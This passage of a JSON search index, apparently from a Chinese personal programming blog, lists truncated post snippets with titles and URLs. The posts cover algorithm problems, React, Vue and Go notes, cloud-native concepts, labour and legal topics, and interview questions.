14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70","lvl0":"切面异常处理","lvl1":null,"lvl2":"摘要","objectID":"7791c087d824013f14876e2e57e391cc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%88%87%E9%9D%A2%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; permuteUnique(vector\u0026lt;int\u0026gt;\u0026amp; nums) { sort(nums.begin(),nums.end()); s = nums; visited = vector\u0026lt;bool\u0026gt; (s.size(),false); dfs(0); return res; } vector\u0026lt;int\u0026gt; s; vector\u0026lt;int\u0026gt; path; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; vector\u0026lt;bool\u0026gt; visited; void dfs(int cur) { if(path.size() \u0026gt;= s.size()) {","lvl0":"全排列算法","lvl1":null,"lvl2":"摘要","objectID":"59dc1440e012a03a01db03beeb09ed9d","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/%E5%85%A8%E6%8E%92%E5%88%97%E7%AE%97%E6%B3%95/"},{"content":"权限列表 数据表格 参考学习视频 - 4分钟 5分钟 可以看操作 operation 按钮 看11分钟 ，表格 overflow 处理方法 数据删除 confirm 参考视频-2分钟 参考视频 - 22分钟 更新数据 参考","lvl0":"权限列表【数据表格_ 数据展示】","lvl1":null,"lvl2":"摘要","objectID":"674f8f4074a470b357c0b25f084791b2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/antd%E4%BD%BF%E7%94%A8/%E6%9D%83%E9%99%90%E5%88%97%E8%A1%A8/"},{"content":"三方协议注意事项 https://www.bilibili.com/video/BV1zb4y1874q?from=search\u0026amp;seid=1139540341837427465\u0026amp;spm_id_from=333.337.0.0 千万别让档案变成死档｜档案、户口、报到证、三方协议 作者：小甜橘~【该账号已停用】 链接：https://www.nowcod","lvl0":"三方协议注意事项","lvl1":null,"lvl2":"摘要","objectID":"45c6f7cef89a0b6321d3269a7c92417c","tags":null,"url":"https://lyr-2000.github.io/post/00.%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0/%E6%AF%95%E4%B8%9A%E6%89%BE%E5%B7%A5%E4%BD%9C/%E4%B8%89%E6%96%B9%E5%8D%8F%E8%AE%AE%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"},{"content":"剑指 Offer II 062. 实现前缀树 Difficulty: **Trie（发音类似 \u0026ldquo;try\u0026rdquo;）或者说 前缀树 是一种树形数据结构，用于高效地存储和检索字符串数","lvl0":"实现前缀树","lvl1":null,"lvl2":"摘要","objectID":"d93b6b54dcacd2272493447f8ea045ed","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/trie/%E5%89%91%E6%8C%87offer.%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%BC%80%E6%A0%91/"},{"content":"实现一个油猴脚本工具 这是一个弹框的 油猴脚本，未来将会继续完善，加入新功能 该脚本 使用 jQuery 和 vue框架 可能会使用的工具 -\u0026gt; 模板引擎 1 2 3 4 5 6 7 8 9","lvl0":"实现一个油猴脚本工具","lvl1":null,"lvl2":"摘要","objectID":"9574533fc8935924080d215bbfe8c960","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java-script%E5%AD%A6%E4%B9%A0/%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/"},{"content":"使用swal alert 弹框组件 1 2 npm install sweetalert --save y 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import swal from \u0026#39;sweetalert\u0026#39;; swal({ title: \u0026#34;Are you sure?\u0026#34;, text: \u0026#34;Once deleted, you will not be able to recover this imaginary file!\u0026#34;, icon: \u0026#34;warning\u0026#34;, buttons: true, dangerMode: true, }) .then((willDelete) =\u0026gt; { if (willDelete) {","lvl0":"使用 swal alert 弹框组件","lvl1":null,"lvl2":"摘要","objectID":"f5332790d79dd03468cdabc880f5d31f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/swal-alert-%E5%BC%B9%E6%A1%86%E7%BB%84%E4%BB%B6/"},{"content":"react 使用 ace.js 1 yarn add react-ace 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62","lvl0":"使用ace.js","lvl1":null,"lvl2":"摘要","objectID":"d4ba8478cbb25df2302d409e1e55b73a","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/react%E4%BD%BF%E7%94%A8ace.js/"},{"content":"有 n 头奶牛，已知它们的身高为 1∼n 且各不相同，但不知道每头奶牛的具体身高。 现在这 nn 头奶牛站成一列，已知第 ii 头牛前面有 Ai 头牛比它低，求每头奶牛","lvl0":"树状数组算法","lvl1":null,"lvl2":"摘要","objectID":"b96e984ea3be731f5d5baab4315d7df1","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84-%E5%B7%AE%E5%88%86/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"content":"八大排序以及java实现 插入排序 算法描述 一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下： 从第一个元素开始，该元素可以","lvl0":"数据结构_八大排序【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"91e18a53300366c79893f72d984bc5d1","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E4%BB%A5%E5%8F%8Ajava%E5%AE%9E%E7%8E%B0/"},{"content":"#跳表 什么是跳表 多层的有序链表，越上层，节点数越少 跳表如何查询 从最上面那层开始，从左往右遍历，直到下一个节点比要查询的值大，往下一层走。循环","lvl0":"数据结构_跳表【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"59cf0abb22fd71479d21647377e73ead","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E8%B7%B3%E8%A1%A8/"},{"content":"数据结构合集 https://blog.csdn.net/cywosp/article/details/23397179 https://blog.csdn.net/qq_43621789/article/details/106917404 一致性哈希算法 哈希算法好坏的定义 1、平衡性(Balance)：平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使","lvl0":"数据结构集合【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"e56a5d99c2a71e858e27300fe846dd2a","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9B%86%E5%90%88/"},{"content":"数位dp 算法模板 学习视频 核心算法原理 参数解释 可选参数： pre:表示上一个数是多少 有些题目会用到前面的数 lead :前导零是否存在，lead=1存在前","lvl0":"数位DP 算法","lvl1":null,"lvl2":"摘要","objectID":"646b8e74dc9ff75ecd69878d6bf26bad","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/%E6%95%B0%E4%BD%8Ddp%E7%AE%97%E6%B3%95/"},{"content":"1012. 至少有 1 位重复的数字 Difficulty: 困难 给定正整数 N，返回小于等于 N 且具有至少 1 位重复数字的正整数的个数。 示例 1： 1 2 3 输入：20 输出：1 解释：具有至少","lvl0":"数位DP例题_阅文笔试题_ lc1012","lvl1":null,"lvl2":"摘要","objectID":"d18cf6e42a04df50ca88facbb874478f","tags":["数位DP","hard"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/lc1012.%E8%87%B3%E5%B0%911%E4%BD%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"数组和列表 定义数组语法 1 2 3 var hens [6]int64 var hens := [...]string{\u0026#34;\u0026#34;} for-range 遍历 1 2 3 4 5 6 7 8 9 10 11 12 package main import ( \u0026#34;fmt\u0026#34; ) func main() { var hens [5]float64 for i := 0; i \u0026lt; len(hens); i++ { fmt.Println(hens[i]) } } 1 2 3 4 5 6 7 8 9 10","lvl0":"数组和列表","lvl1":null,"lvl2":"摘要","objectID":"3114dea653e4b56dba0fa7b869133cfd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/%E6%95%B0%E7%BB%84%E5%92%8C%E5%88%97%E8%A1%A8/"},{"content":"幼儿园里有 N 个小朋友，老师现在想要给这些小朋友们分配糖果，要求每个小朋友都要分到糖果。 但是小朋友们也有嫉妒心，总是会提出一些要求，比如小明不","lvl0":"糖果","lvl1":null,"lvl2":"摘要","objectID":"716b43c436a6b0e518191f94e08a24a8","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%9B%BE%E8%AE%BA%E9%97%AE%E9%A2%98/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F/%E7%B3%96%E6%9E%9C/"},{"content":"文件秒传的实现方法 参考的博客 csdn 博客 文件的常用校验算法 CRC(32/64) MD5 SHA1 文件秒传的应用场景 用户上传 离线下载 好友分享 关键点： 文件 Hash(MD5,SHA1等","lvl0":"文件秒传实现","lvl1":null,"lvl2":"摘要","objectID":"f45f9ae97cd6dddff44c06eb40aa4837","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E6%96%87%E4%BB%B6%E7%A7%92%E4%BC%A0%E5%AE%9E%E7%8E%B0/"},{"content":"面试题 17.19. 消失的两个数字 Difficulty: 困难 给定一个数组，包含从 1 到 N 所有的整数，但其中缺了两个数字。你能在 O(N) 时间内只用 O(1) 的空间找到它们吗？ 以任意顺序返回这","lvl0":"消失的2个数字","lvl1":null,"lvl2":"摘要","objectID":"72f94f608ab6898fef26d1509878160d","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/%E6%9A%B4%E5%8A%9B%E9%A2%98/%E6%B6%88%E5%A4%B1%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97/"},{"content":"云原生相关 云计算（cloud computing）是分布式计算的一种，指的是通过网络“云”将巨大的数据计算处理程序分解成无数个小程序，然后，通","lvl0":"新概念学习","lvl1":null,"lvl2":"摘要","objectID":"fc3e4b891281e44e01fadc88b613f7fd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/%E6%96%B0%E6%A6%82%E5%BF%B5%E5%AD%A6%E4%B9%A0/"},{"content":"学习视频 参考路由配置 官网文档 监听路由跳转 ，修改 title 参考学习视频","lvl0":"修改路由配置","lvl1":null,"lvl2":"摘要","objectID":"d158f5757475bbff6e3d09eb0a17ca01","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/%E4%BF%AE%E6%94%B9%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE/"},{"content":"一些学校连接在一个计算机网络上，学校之间存在软件支援协议，每个学校都有它应支援的学校名单（学校 A 支援学校 B，并不表示学校 B 一定要支援学校 A）","lvl0":"学校网络","lvl1":null,"lvl2":"摘要","objectID":"4774e67f1d3d5f2f95ac8b42d3347077","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%9B%BE%E8%AE%BA%E9%97%AE%E9%A2%98/tarjan%E7%AE%97%E6%B3%95%E4%BE%8B%E9%A2%98/%E5%AD%A6%E6%A0%A1%E7%BD%91%E7%BB%9C/"},{"content":"https://blog.csdn.net/cywosp/article/details/23397179 https://blog.csdn.net/qq_43621789/article/details/106917404 一致性哈希算法 哈希算法好坏的定义 1、平衡性(Balance)：平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲","lvl0":"一致性哈希算法【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"25829ad298272dc7ab96f1068983eae2","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95/"},{"content":"硬币找零 给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总","lvl0":"硬币找零和贪心问题","lvl1":null,"lvl2":"摘要","objectID":"ca49af0c3c1cc35e290d00a8810b978e","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/01%E8%83%8C%E5%8C%85%E5%8F%98%E9%A2%98/%E7%A1%AC%E5%B8%81%E6%89%BE%E9%9B%B6%E5%92%8C%E8%B4%AA%E5%BF%83/"},{"content":"云平台核心 云原生的概念 1.1 为什么用云平台 环境统一 按需付费 即开即用 稳定性强 国内常见云平台： 阿里云、百度云、腾讯云、华为云、青云\u0026hellip;\u0026","lvl0":"云原生的概念【云原生】","lvl1":null,"lvl2":"摘要","objectID":"bef31e9b95deec964c330f9a9a07be65","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E6%96%B0%E6%8A%80%E6%9C%AF%E6%9D%82%E8%AE%B0/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5/"},{"content":"剑指 Offer II 096. 字符串交织 Difficulty: 中等 给定三个字符串 s1、s2、s3，请判断 s3 能不能由 s1 和 s2交织（交错） 组成。 两个字符串 s 和 t 交织 的定义与过程如下，其","lvl0":"字符串交错组成","lvl1":null,"lvl2":"摘要","objectID":"885a990d021d702fd62d5f72561a1334","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%8C%BA%E9%97%B4dp/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BA%A4%E9%94%99%E7%BB%84%E6%88%90/"},{"content":"自定义 hooks组件 监听 windows size 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import React, { useCallback, useEffect, useState } from \u0026#34;react\u0026#34;; function useWinSize() { const [size,setSize] = useState({ width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, }) const onResize = useCallback(()=\u0026gt;{ setSize({ width: document.documentElement.clientWidth,","lvl0":"自定义 hooks组件","lvl1":null,"lvl2":"摘要","objectID":"8e60eb28341d55ee4a934dbac3922231","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/%E8%87%AA%E5%AE%9A%E4%B9%89-hooks-%E7%BB%84%E4%BB%B6/"},{"content":"给定一个长度为 n 的正整数数列 $ a_1,a_2,…,a_n $ 。 初始时，数列中的每个元素要么处于可选状态，要么处于不可选状态。 你可以选择一个长度","lvl0":"最大的和","lvl1":null,"lvl2":"摘要","objectID":"93287c772f3f07492d24b51bc99bf659","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%B7%AE%E5%88%86%E5%89%8D%E7%BC%80%E5%92%8C/%E6%9C%80%E5%A4%A7%E7%9A%84%E5%92%8C/"},{"content":"5. 最长回文子串 Difficulty: 中等 给你一个字符串 s，找到 s 中最长的回文子串。 示例 1： 1 2 3 输入：s = \u0026#34;babad\u0026#34; 输出：\u0026#34;bab\u0026#34; 解释：\u0026#34;ab","lvl0":"最长回文字串","lvl1":null,"lvl2":"摘要","objectID":"d3bcc0a279ebc0158505b97617d0cdd6","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%8C%BA%E9%97%B4dp/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%97%E4%B8%B2/"},{"content":"创业公司确实不容易，老板起早贪黑，员工亦是没日没夜地干活。但这中间，一旦哪个环节出现问题，就有可能导致整个公司都崩盘。 小王去了一家 P2P 创业公司","lvl0":"打工人注意点","lvl1":["法律"],"lvl2":"摘要","objectID":"fc3eb59ab672684fc92fc542dffc099a","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E6%89%93%E5%B7%A5%E4%BA%BA%E6%B3%A8%E6%84%8F%E7%82%B9/"},{"content":"现在创业公司员工的两大迷雾，无非是相当火热的“股权”和“期权”。前面我们学完股权内容后，不少留言都在问，期权究竟是怎么回事，离职后期权要怎么","lvl0":"股权","lvl1":["法律"],"lvl2":"摘要","objectID":"3fe627d70042a0ed63f8a1328b45b1fe","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E8%82%A1%E6%9D%83/"},{"content":"首先我们要了解加班时间的规定。我们实行的是 8 小时工作制，但并没有禁止公司安排 8 小时外的加班，只不过，法律上要求，公司安排加班，必须符合《劳动","lvl0":"加班费怎么算？","lvl1":["法律"],"lvl2":"摘要","objectID":"e6bfe2276a08d0444ab887d26f20ee67","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E5%8A%A0%E7%8F%AD%E8%B4%B9%E6%80%8E%E4%B9%88%E7%AE%97/"},{"content":"事实上，法律上有专门的几个名词，用来定义这样的行为，我们逐个来看。 第一个概念叫做商业信誉，比较好理解，是指企业在商业上获得的正面的社会评价，","lvl0":"商品信誉相关","lvl1":["法律"],"lvl2":"摘要","objectID":"1a56c6620acbbb315cdcbf7e1dce9861","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E5%95%86%E5%93%81%E4%BF%A1%E8%AA%89%E7%9B%B8%E5%85%B3/"},{"content":"小白是一家 P2P 公司的 PHP 程序员，主要负责网页工作，为公司宣传、招揽客户。然而两个月前，公司的资金链断裂，高达上亿的资金迟迟不能到位，濒临破产。两","lvl0":"什么是非法集资","lvl1":["法律"],"lvl2":"摘要","objectID":"5b0e7832c5dded04e078e613bce80ac6","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E9%9D%9E%E6%B3%95%E9%9B%86%E8%B5%84/"},{"content":"非国家工作人员受贿罪 在过去，这个罪一直叫作“公司、企业人员受贿罪”，后来修改成了“非国家工作人员受贿罪”。名称上的变动，可以看出，新罪名针对","lvl0":"受贿法律问题","lvl1":["法律"],"lvl2":"摘要","objectID":"80b0aa9737bcfdb66404b7db5a161d0b","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E5%8F%97%E8%B4%BF%E7%9A%84%E6%B3%95%E5%BE%8B%E9%97%AE%E9%A2%98/"},{"content":"第八问：中级法院作出二审民事判决后，我对结果仍然不服，还能再继续起诉吗？应该如何维权？ 老周答：我国法院审理普通程序的案件，实行的是两审终审制","lvl0":"诉讼的注意点","lvl1":["法律"],"lvl2":"摘要","objectID":"f9cec640d15eed2343d6a4735e59cec6","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E8%AF%89%E8%AE%BC%E7%9A%84%E6%B3%A8%E6%84%8F%E7%82%B9/"},{"content":"前不久某鹅厂 23 岁安全工程师的新闻，想必你不会陌生。年轻的工程师，因为对酒店的 Wi-Fi 系统顺手一测，又顺手一发给传播了出去，就被新加坡安全局给抓了。","lvl0":"网络安全问题","lvl1":["法律"],"lvl2":"摘要","objectID":"0037216a2d034c9dd5c707ee43d3114d","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"content":"说到这个结构，就不得不提一下安卓的几大结构吧主要包括 MVC、MVP、MVVM 这三大结构 MVC结构 Model ：实体模型、数据的获取、存储等等 View ：Act","lvl0":"MVVM架构","lvl1":["程序语言","Android相关"],"lvl2":"摘要","objectID":"6b1d8cf8e2e3404200cbf8bc06183d37","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/05.android%E7%9B%B8%E5%85%B3/01.mvvm%E6%9E%B6%E6%9E%84/"},{"content":"Java核心技术 卷一 基本数据结构 java break可以带标签 大数值可以使用bigInteger和bigDecimal for each使用 1 2 3 for (int a:new int[]{1,2,3}){ System.out.println(a);","lvl0":"Java书籍学习笔记","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"580ec659755a4f1563fd8cf3ae5f92a4","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/13.java%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"content":"对象图有几种 UML大科普：一文梳理清 14种 UML图！ (yinxiang.com) UML图分为结构图和行为图。 结构图分为类图、轮廓图、组件图、组合结构图、对象图、部署图","lvl0":"面试问题","lvl1":["基础学科","软件工程"],"lvl2":"摘要","objectID":"b84c7086cca313601e2e56c932446114","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/03.%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/01.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"https中间人攻击 如何防止请求被篡改 使用https来进行请求（这点我居然没想到。。） 设置客户端白名单，客户端所有请求，请求到代理服务器(n","lvl0":"网络安全","lvl1":["其他","安全相关"],"lvl2":"摘要","objectID":"b0489c62ba02be2cf9a35fec759502f4","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/04.%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/01.%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"content":"跨域问题怎么处理 通过jsonp跨域 document.domain + iframe跨域 location.hash + iframe window.name + iframe跨域 postMessage跨域 跨域资源共享（CORS） nginx","lvl0":"前端","lvl1":["程序语言","JavaScript和HTML"],"lvl2":"摘要","objectID":"054a15563b55ed4117e965b6958e0a7c","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/04.javascript%E5%92%8Chtml/03.%E5%89%8D%E7%AB%AF/"},{"content":"优化相关 怎么优化界面，让用户体验更好 减少 HTTP 请求 使用 HTTP2 使用服务端渲染 客户端渲染: 获取 HTML 文件，根据需要下载 JavaScript 文件，运行文件，生成 DOM，再渲染。","lvl0":"HTML","lvl1":["程序语言","JavaScript和HTML"],"lvl2":"摘要","objectID":"ff6f55b3ff7ecbbfabc812987f439c2b","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/04.javascript%E5%92%8Chtml/02.html/"},{"content":"JavaScript事件机制 DOM事件流（event flow ）存在三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段。 事件捕获（event capt","lvl0":"JavaScript","lvl1":["程序语言","JavaScript"],"lvl2":"摘要","objectID":"cc54425e36a7640945b2f887d41599a5","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/04.javascript%E5%92%8Chtml/01.javascript/"},{"content":"this指针是干嘛的 其作用就是指向成员函数所作用的对象， 所以非静态成员函数中可以直接使用 this 来代表指向该函数作用的对象的指针。 静态成员函数是不","lvl0":"面试常问问题","lvl1":["程序语言","CC++语言"],"lvl2":"摘要","objectID":"010778ad897c422de2bb0aed6468d054","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/03.cc++%E8%AF%AD%E8%A8%80/02.%E9%9D%A2%E8%AF%95%E5%B8%B8%E9%97%AE%E9%97%AE%E9%A2%98/"},{"content":"64匹马，8个赛道，找出跑得最快的4匹马 全部马分为8组，每组8匹，每组各跑一次，然后淘汰掉每组的后四名，如下图（需要比赛8场） 第一步 